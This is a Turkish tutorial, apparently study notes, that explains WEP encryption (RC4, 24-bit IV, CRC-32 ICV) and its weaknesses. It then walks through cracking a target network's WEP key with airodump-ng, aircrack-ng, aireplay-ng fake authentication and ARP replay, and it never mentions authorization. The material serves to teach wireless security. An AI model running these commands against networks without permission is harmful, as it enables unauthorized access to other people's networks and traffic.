- Wifi ağları **WEP** ve **WPA/WPA2** ile şifreleme algoritmaları ile korunur.
---
## 🔐 WEP (Wired Equivalent Privacy) Nedir?

WEP, kablosuz ağları korumak için geliştirilen **eski** bir şifreleme sistemidir. Amaç: 📡 Wi-Fi'yi, kablolu ağlar kadar güvenli yapmak.

---

### 🧠 Nasıl Çalışır?

#### 1. 🔒 Şifreleme Türü: **RC4**
- WEP, verileri **RC4** adlı simetrik bir algoritmayla şifreler.

#### 2. 🧩 Anahtar Yapısı
- İki tür anahtar vardır:
  - **64 bit** (40 bit gizli + 24 bit IV)
  - **128 bit** (104 bit gizli + 24 bit IV)
- **IV (Initialization Vector)**: 📦 Her veri paketine özel küçük bir sayı (24 bit)
- **IV + gizli anahtar = RC4 anahtarı**

#### 3. 🔁 Şifreleme Süreci
1. Veri alınır. 📄  
2. Sonuna hata kontrol için bir şey eklenir: **ICV (CRC-32)** ✅  
3. IV + anahtar → RC4 → 🔐 Şifreleme akışı oluşturur  
4. Veri + ICV, bu akışla **XOR**'lanır  
5. Sonuç = Şifreli veri + IV → 📡 Gönderilir

#### 4. 📥 Alıcı Ne Yapar?
1. IV'yi alır + gizli anahtarla RC4 akışı oluşturur  
2. XOR işlemiyle şifreyi çözer 🔓  
3. ICV kontrolüyle verinin bozulup bozulmadığını anlar ✅

---

### ⚠️ WEP Neden Güvensiz?

| Sorun | Açıklama |
|------|----------|
| 🔁 IV çok kısa | 24 bit → sık tekrar eder → kırılabilir |
| 🎲 IV rastgele değil | Sıralı olabilir → tahmin edilebilir |
| 🧨 RC4 kötü kullanılır | Zayıf anahtar oluşturur |
| 🧪 Kolay kırılır | Paketler toplanır → şifre dakikalar içinde çözülür (örn: aircrack-ng) |

---

### ✅ Ne Kullanmalı?

WEP yerine:  
- **🔐 WPA**  
- **🛡️ WPA2**  
- **🧬 WPA3** gibi daha güvenli protokoller kullanın.

---

## 🧨 WEP Kırma

### 1. 📡 Modemi Dinleme
- `airodump-ng` ile hedef ağı dinle:
  ```bash
  airodump-ng (interface)
  ```
- Ekrandaki hedef modem bilgilerini (BSSID ve kanal) not al.

### 2. 📥 Paket Toplama ve Şifreyi Kırma
- Dinleme sırasında `.cap` uzantılı bir dosya oluşur.
- Bu dosyayla şu komutu çalıştır:
  ```bash
  aircrack-ng dosya.cap
  ```
- 🗝️ Şifre doğrudan terminalde görünür!

⚠️ **Not:** Bu işlemin çalışması için ağda **aktif trafik** olması gerekir.

---

## 🕵️‍♂️ Fake Authentication (Sahte Kimlik Doğrulama)

Ağda yeterli trafik yoksa kendin oluşturabilirsin. İşte adımlar:

### 🔐 1. Sahte Bağlantı Kurma
```bash
aireplay-ng --fakeauth 0 -a (BSSID) -h (Wi-Fi kart MAC)
```
- 📡 Modeme sahte bir şekilde bağlanır.
- MAC adresini öğrenmek için:
  ```bash
  ip addr
  ```

### 🔁 2. ARP Replay ile Trafik Oluşturma
```bash
aireplay-ng --arpreplay -b (BSSID) -h (Wi-Fi kart MAC)
```
- 💣 Modemde **sahte veri trafiği** oluşturur.
- Bu sayede şifreleme kırılabilir hale gelir.
